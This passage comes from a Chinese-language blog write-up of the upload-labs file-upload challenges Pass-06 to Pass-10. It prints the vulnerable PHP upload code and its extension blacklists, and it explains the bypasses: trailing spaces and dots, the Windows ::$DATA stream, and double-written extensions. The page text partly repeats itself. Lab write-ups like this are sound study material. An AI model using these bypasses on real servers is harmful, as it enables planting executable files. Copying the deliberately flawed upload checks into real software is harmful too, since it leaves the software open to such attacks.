两种方式第一个在linux环境下的php服务器上，第二个在windows环境下的php服务器上，上传后都可以成功访问文件。完工</p>\n<h2 id=\"Pass-08\"><a href=\"#Pass-08\" class=\"headerlink\" title=\"Pass-08\"></a>Pass-08</h2><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span><br><span class=\"line\">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class=\"line\">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class=\"line\">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class=\"line\">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class=\"line\">        $file_ext = trim($file_ext); //首尾去空</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class=\"line\">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span><br><span class=\"line\">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class=\"line\">                $is_upload = true;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    审查代码发现少了对<code>::$DATA</code>字符串的处理，这里就要用到前面提到的windows环境了，贴一下原理：</p>\n<blockquote>\n<p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p>\n</blockquote>\n<p>​    直接上传的时候抓包在文件名后面添加<code>::$DATA</code>。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BbP84P.png\"></p>\n<p>​    上传访问。完工</p>\n<h2 id=\"Pass-09\"><a href=\"#Pass-09\" class=\"headerlink\" title=\"Pass-09\"></a>Pass-09</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class=\"line\">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class=\"line\">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class=\"line\">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class=\"line\">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class=\"line\">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class=\"line\">        $file_ext = trim($file_ext); //首尾去空</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class=\"line\">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class=\"line\">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class=\"line\">                $is_upload = true;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    这次题目和第七题差不多，代码会先剔除文件名前后的空格，然后删除末尾的点，再通过<code>strrchr()</code>函数截取后缀名转换小写。</p>\n<p>​    所以和第七题一样构造<strong>2333.php. .</strong>(末尾加 点 空格 点)，被处理后的文件名后缀就成了一个点”.”，铁定不在黑名单后缀里，实现绕过后缀检查。</p>\n<p>​    但是这道题<strong>只能使用windows环境</strong>，因为执行了<code>deldot()</code>函数删除了最后一个点之后，文件名成了<code>2333.php.</code>，而linux环境下因为不会自动删除最后一个点而不能访问成功。</p>\n<p>​    图前面有了就不贴了。</p>\n<h2 id=\"Pass-10\"><a href=\"#Pass-10\" class=\"headerlink\" title=\"Pass-10\"></a>Pass-10</h2><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class=\"line\">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class=\"line\">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">        $img_path =  UPLOAD_PATH.&#x27;/&#x27;.$file_name;        </span><br><span class=\"line\">        if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class=\"line\">            $is_upload = true;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    这道题和前面不同的是<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name)</code>，对于这个函数：<code>str_ireplace(find,replace,string,count)</code>，find是要查找的值，replace是要替换成的值，string是被搜索的字符串，count 可选。一个变量，对替换数进行计数。所以这行代码的作用就是把文件名中所有包含在黑名单后缀里的字符串替换成空串，但是这个函数只会执行一次，所以我们可以构造一个双写绕过，即构造文件名<code>2333.pphphp</code>，只有一个”php”字符串被匹配到并被替换成空串，剩下的文件名就成了<code>2333.php</code>。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/Bb8yPf.png\"></p>\n<p>上传并访问文件。完工</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">    //这里下面是过滤</span><br><span class=\"line\">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.html&quot;, ......);</span><br><span class=\"line\">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class=\"line\">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class=\"line\">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class=\"line\">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class=\"line\">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class=\"line\">        $file_ext = trim($file_ext); //首尾去空</span><br><span class=\"line\"></span><br><span class=\"line\">\t//这里下面是移动文件。</span><br><span class=\"line\">    \tif (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class=\"line\">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class=\"line\">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class=\"line\">                $is_upload = true;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>过滤部分：</p>\n<ul>\n<li><p><code>$deny_ext</code>是一个过滤的后缀数组，只要是在里面的后缀都是被禁止上传的。</p>\n</li>\n<li><p><code>$file_name = trim($FILES[&#39;upload_file&#39;][&#39;name&#39;])</code>这段代码有两个点需要说：</p>\n<ol>\n<li><code>$FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>是获取上传文件的名称，PHP中$FILES是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $FILES 为二维数组；如果为多个文件上传，那么 $FILES 为三维数组。贴一个参考的博客：<a href=\"https://www.cnblogs.com/laijinquan/p/8682282.html\">PHP $_FILES函数详解</a>。</li>\n<li><code>trim()</code>函数的作用就是去除文件名称前后的空格换行符等。</li>\n</ol>\n</li>\n<li><p><code>$file_name = deldot($file_name)</code>这个注释中很清楚，是删除文章末尾的点。</p>\n</li>\n<li><p><code>$file_ext = strrchr($file_name, &#39;.&#39;)</code>中<code>strrchr(string s1,char c1)</code>函数查找字符或字符串c1在另一个字符串s1中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。说白了就是获取文件的后缀名。</p>\n</li>\n<li><p><code>$file_ext = strtolower($file_ext)</code>注释上转换小写。</p>\n</li>\n<li><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext)</code>去除字符串::$DATA。第八题讲了原理</p>\n</li>\n</ul>\n<p>上传部分：</p>\n<ul>\n<li><code>in_array($file_ext, $deny_ext)</code>判断文件的后缀(第一个参数)是不是在黑名单数组(第二个参数)中。</li>\n<li><code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定。</li>\n<li> <code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name</code>这个变量是设置需要保存到的路径</li>\n<li><code>move_uploaded_file($temp_file, $img_path)</code>本函数检查并确保指定的文件(第一个参数)是合法的上传文件(即通过 PHP 的 HTTP POST 上传机制所上传的)。如果文件合法，则将其移动为由指定的文件路径(第二个参数)。</li>\n</ul>\n<h2 id=\"Pass-06\"><a href=\"#Pass-06\" class=\"headerlink\" title=\"Pass-06\"></a>Pass-06</h2><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class=\"line\">        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class=\"line\">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class=\"line\">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class=\"line\">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class=\"line\">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class=\"line\">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span><br><span class=\"line\">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class=\"line\">                $is_upload = true;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;此文件不允许上传&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    看源码发现少了<code>trim()</code>函数<strong>对文件名前后的空格处理</strong>，所以我们可以在上传文件时在后缀名后面添加空格使其成为.php  (有空格)绕过黑名单数组。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/Bb9jQe.png\"></p>\n<p>​    上传以后访问文件执行成功。完工</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/Bb9xLd.png\"></p>\n<p>​    这里说明一下，我前面是在<a href=\"https://buuoj.cn/\">BUUCTF</a>在线靶场上做的linux环境下的题目，但是这道题用了上面的方法怎么都访问不到，所以我在本地windows环境上搭建了一个靶机进行上传(而且后面有道题必须是在windows环境下才可以通过)。在github上下载的源码题目比在线靶场上的题目多了一道，对应的题目为 在线靶机pass-06–&gt;github下载的pass-07。默认使用的都是linux环境下的题目，有改变会提前说明。</p>\n<p>​    </p>\n<h2 id=\"Pass-07\"><a href=\"#Pass-07\" class=\"headerlink\" title=\"Pass-07\"></a>Pass-07</h2><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class=\"line\">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class=\"line\">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class=\"line\">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class=\"line\">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class=\"line\">        $file_ext = trim($file_ext); //首尾去空</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class=\"line\">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class=\"line\">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class=\"line\">                $is_upload = true;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    这道题少了<strong>删除文件名末尾的点</strong>，我们可以通过构造<strong>2333.php. .</strong>(末尾加 点 空格 点)，被解析后文件后缀就会成为”. “(一个点一个空格)，可以绕过黑名单，访问的文件名是<code>2333.php. .</code></p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BbCOkq.png\"></p>\n<p>​    我又参考了其他博客，讲到windows环境下可以利用系统会自动删除后缀中最后的一个”.”，尝试在windows靶机上测试<strong>只添加一个点</strong>，访问的文件名为<code>2333.php、2333.php.</code>都可以，因为windows会删除最后一个点。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BbMywV.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BbKXq0.png\"></p>\n<p>​    两种方式第一个在linux环境下的php服务器上，第二个在windows环境下的php服务器上，上传后都可以成功访问文件。完工</p>\n<h2 id=\"Pass-08\"><a href=\"#Pass-08\" class=\"headerlink\" title=\"Pass-08\"></a>Pass-08</h2><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        $deny_ext = 